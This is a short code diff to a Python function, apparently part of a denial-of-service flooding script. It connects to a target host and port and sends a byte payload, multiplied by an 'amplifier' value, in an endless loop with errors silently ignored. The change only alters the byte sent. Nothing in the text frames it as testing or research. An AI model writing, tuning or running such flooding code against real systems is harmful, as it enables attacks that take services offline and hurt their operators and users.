@@ -13,7 +13,7 @@ def send_packet(amplifier):
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.connect((str(host), int(port)))
         while True:
-            s.send(b"\x200" * amplifier)
+            s.send(b"\x99" * amplifier)
     except:
         return
     s.close()
